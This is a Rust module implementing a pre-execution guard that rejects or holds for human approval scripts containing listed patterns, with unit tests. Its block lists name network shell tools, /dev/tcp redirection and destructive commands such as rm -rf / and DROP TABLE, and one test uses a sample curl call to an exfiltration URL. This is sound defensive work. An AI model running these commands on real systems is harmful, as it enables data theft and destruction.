use serde_json::Value;

use super::compiler::Artifact;

pub(crate) struct ArtifactGuard;

pub(crate) enum ScanVerdict {
    Approved,
    Gated { reason: Box<str> },
    Rejected { reason: Box<str> },
}

/// Scripts larger than this are rejected outright.
const MAX_SCRIPT_SIZE: usize = 65_536;

/// Patterns that require human approval before execution, grouped by effect category.
/// Each entry is (pattern, category) — the category surfaces in the approval prompt.
const HITL_PATTERNS: &[(&str, &str)] = &[
    // Network exfiltration
    ("> /dev/tcp",       "network exfil"),
    ("| nc ",            "network exfil"),
    ("| ncat ",          "network exfil"),

    // Destructive filesystem
    ("rm -rf /",         "destructive: filesystem"),
    ("rm -rf ~",         "destructive: filesystem"),
    ("mkfs.",            "destructive: filesystem"),
    ("dd if=",           "destructive: filesystem"),
    ("> /etc/",          "destructive: filesystem"),

    // Destructive database
    ("DROP TABLE",       "destructive: database"),
    ("DROP DATABASE",    "destructive: database"),
    ("TRUNCATE TABLE",   "destructive: database"),

    // Outbound communications
    ("smtp.",            "outbound: email"),
    ("sendgrid.",        "outbound: email"),
    ("twilio.",          "outbound: sms"),
    ("mailgun.",         "outbound: email"),

    // Financial operations
    ("stripe.charge(",   "financial"),
    ("stripe.create(",   "financial"),
    ("paypal.payment(",  "financial"),
    (".create_payment(", "financial"),
];

impl ArtifactGuard {
    pub(crate) fn new() -> ArtifactGuard {
        ArtifactGuard
    }

    pub(crate) fn scan(&self, artifact: &Artifact, constraints: Option<&Value>) -> ScanVerdict {
        if let Some(v) = self.static_analysis(artifact) { return v; }
        if let Some(v) = self.capability_check(artifact, constraints) { return v; }
        if let Some(v) = self.resource_bounds(artifact) { return v; }
        if let Some(v) = self.hitl_scan(artifact) { return v; }
        ScanVerdict::Approved
    }

    // Stage 1: reject forbidden shell patterns in Proactive scripts
    fn static_analysis(&self, artifact: &Artifact) -> Option<ScanVerdict> {
        let Artifact::Script { code, .. } = artifact else { return None; };

        const FORBIDDEN: &[&str] = &[
            "import os", "import sys", "import subprocess",
            "curl ", "wget ", "nc ", "ncat ",
            "rm -rf", "mkfs", "dd if=",
        ];

        for pattern in FORBIDDEN {
            if code.contains(pattern) {
                return Some(ScanVerdict::Rejected {
                    reason: format!("forbidden pattern in script: `{pattern}`").into(),
                });
            }
        }

        None
    }

    // Stage 2: reject if artifact uses tools not permitted by gap constraints
    fn capability_check(&self, artifact: &Artifact, constraints: Option<&Value>) -> Option<ScanVerdict> {
        let Artifact::Agent { tools, .. } = artifact else { return None; };
        let Some(constraints) = constraints else { return None; };
        let Some(allowed) = constraints.get("allowed_tools").and_then(|v| v.as_array()) else {
            return None;
        };

        let allowed_strs: Vec<&str> = allowed.iter().filter_map(|v| v.as_str()).collect();

        for tool in tools.iter() {
            if !allowed_strs.contains(&tool.as_ref()) {
                return Some(ScanVerdict::Rejected {
                    reason: format!("tool `{tool}` not permitted by gap constraints").into(),
                });
            }
        }

        None
    }

    // Stage 3: reject scripts that exceed the size limit
    fn resource_bounds(&self, artifact: &Artifact) -> Option<ScanVerdict> {
        let Artifact::Script { code, .. } = artifact else { return None; };

        if code.len() > MAX_SCRIPT_SIZE {
            return Some(ScanVerdict::Rejected {
                reason: format!(
                    "script size {} exceeds limit {}",
                    code.len(),
                    MAX_SCRIPT_SIZE
                )
                .into(),
            });
        }

        None
    }

    // Stage 4: flag high-risk patterns for human review, grouped by effect category
    fn hitl_scan(&self, artifact: &Artifact) -> Option<ScanVerdict> {
        let Artifact::Script { code, .. } = artifact else { return None; };

        for (pattern, category) in HITL_PATTERNS {
            if code.contains(pattern) {
                return Some(ScanVerdict::Gated {
                    reason: format!("{category}: `{pattern}`").into(),
                });
            }
        }

        None
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    fn guard() -> ArtifactGuard {
        ArtifactGuard::new()
    }

    fn script(code: &str) -> Artifact {
        Artifact::Script {
            language: "shell".into(),
            code: code.into(),
            timeout_secs: 10,
        }
    }

    fn agent(tools: Vec<&str>) -> Artifact {
        Artifact::Agent {
            role: "assistant".into(),
            goal: "help".into(),
            tools: tools.into_iter().map(|s| s.into()).collect(),
            instructions: "do stuff".into(),
        }
    }

    #[test]
    fn clean_script_is_approved() {
        let verdict = guard().scan(&script("echo hello"), None);
        assert!(matches!(verdict, ScanVerdict::Approved));
    }

    #[test]
    fn forbidden_import_is_rejected() {
        let verdict = guard().scan(&script("import os\nprint(os.listdir('.'))"), None);
        assert!(matches!(verdict, ScanVerdict::Rejected { .. }));
    }

    #[test]
    fn forbidden_network_call_is_rejected() {
        let verdict = guard().scan(&script("curl https://evil.example.com/exfil"), None);
        assert!(matches!(verdict, ScanVerdict::Rejected { .. }));
    }

    #[test]
    fn script_exceeding_size_limit_is_rejected() {
        let big = "x".repeat(MAX_SCRIPT_SIZE + 1);
        let verdict = guard().scan(&script(&big), None);
        assert!(matches!(verdict, ScanVerdict::Rejected { .. }));
    }

    #[test]
    fn blocklist_pattern_is_gated() {
        let verdict = guard().scan(&script("stripe.charge(customer_id, amount)"), None);
        assert!(matches!(verdict, ScanVerdict::Gated { .. }));
    }

    #[test]
    fn destructive_db_pattern_is_gated() {
        let verdict = guard().scan(&script("DROP TABLE users;"), None);
        assert!(matches!(verdict, ScanVerdict::Gated { .. }));
    }

    #[test]
    fn agent_with_allowed_tools_is_approved() {
        let constraints = json!({ "allowed_tools": ["search", "calculator"] });
        let verdict = guard().scan(&agent(vec!["search", "calculator"]), Some(&constraints));
        assert!(matches!(verdict, ScanVerdict::Approved));
    }

    #[test]
    fn agent_with_disallowed_tool_is_rejected() {
        let constraints = json!({ "allowed_tools": ["search"] });
        let verdict = guard().scan(&agent(vec!["search", "file_delete"]), Some(&constraints));
        assert!(matches!(verdict, ScanVerdict::Rejected { .. }));
    }

    #[test]
    fn static_analysis_wins_before_hitl() {
        // Both a forbidden import AND a HITL pattern — static analysis fires first → Rejected not Gated
        let verdict = guard().scan(&script("import os\nDROP TABLE users;"), None);
        assert!(matches!(verdict, ScanVerdict::Rejected { .. }));
    }
}
